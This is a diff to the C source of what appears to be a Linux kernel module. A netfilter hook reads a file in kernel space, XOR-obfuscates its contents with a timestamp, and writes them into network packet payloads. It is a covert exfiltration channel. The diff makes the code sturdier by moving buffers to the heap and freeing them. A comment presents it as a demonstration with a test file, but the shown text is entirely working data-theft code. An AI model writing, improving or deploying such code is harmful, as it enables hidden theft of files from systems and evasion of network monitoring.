@@ -50,45 +50,61 @@ static struct nf_hook_ops *nfho = NULL;
 
 //function that demonstrates the exfiltration of a test file.
 static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len) {
-    //file variables
     struct file *testfile;
-    char buffer[1400];
+    char *buffer;
+    char *stamped;
     loff_t pos = 0;
     ssize_t bytes_read;
     int max_data = payload_len - 6; //6 header bytes: 4 timestamp + 2 length
     int i;
+    time64_t ts;
+    u32 ts32;
+    u8 ts_bytes[4];
 
     if (max_data <= 0)
         return NF_ACCEPT;
 
+    if (max_data > 1400)
+        max_data = 1400;
+
+    //allocate buffers on heap to avoid kernel stack overflow
+    buffer = kmalloc(max_data + 1, GFP_ATOMIC);
+    if (!buffer)
+        return NF_ACCEPT;
+
+    stamped = kmalloc(6 + max_data, GFP_ATOMIC);
+    if (!stamped) {
+        kfree(buffer);
+        return NF_ACCEPT;
+    }
+
     //Open the file
     testfile = filp_open(TEST_FILE, O_RDONLY, 0);
     if (IS_ERR(testfile)) {
+        kfree(buffer);
+        kfree(stamped);
         return NF_ACCEPT;
     }
 
     //Read from the file, capped at payload space and buffer size
-    bytes_read = kernel_read(testfile, buffer, min((size_t)max_data, sizeof(buffer) - 1), &pos);
+    bytes_read = kernel_read(testfile, buffer, max_data, &pos);
     if (bytes_read < 0) {
         filp_close(testfile, NULL);
+        kfree(buffer);
+        kfree(stamped);
         return NF_ACCEPT;
     }
     buffer[bytes_read] = '\0';
-
-    //close file
     filp_close(testfile, NULL);
 
     //build stamped payload: [4 bytes ts][2 bytes len][xor'd content]
-    time64_t ts = ktime_get_real_seconds();
-    u32 ts32 = (u32)ts;
-    u8 ts_bytes[4] = {
-        ts32 & 0xFF,
-        (ts32 >> 8) & 0xFF,
-        (ts32 >> 16) & 0xFF,
-        (ts32 >> 24) & 0xFF
-    };
+    ts = ktime_get_real_seconds();
+    ts32 = (u32)ts;
+    ts_bytes[0] = ts32 & 0xFF;
+    ts_bytes[1] = (ts32 >> 8) & 0xFF;
+    ts_bytes[2] = (ts32 >> 16) & 0xFF;
+    ts_bytes[3] = (ts32 >> 24) & 0xFF;
 
-    char stamped[1406];
     memcpy(stamped, ts_bytes, 4);
     stamped[4] = (bytes_read >> 8) & 0xFF;
     stamped[5] = bytes_read & 0xFF;
@@ -97,6 +113,9 @@ static unsigned int exfil_file(struct sk_buff *skb, int offset, int payload_len)
         stamped[6 + i] = buffer[i] ^ ts_bytes[i % 4];
 
     skb_store_bits(skb, offset, stamped, 6 + bytes_read);
+
+    kfree(buffer);
+    kfree(stamped);
     return NF_ACCEPT;
 
 }
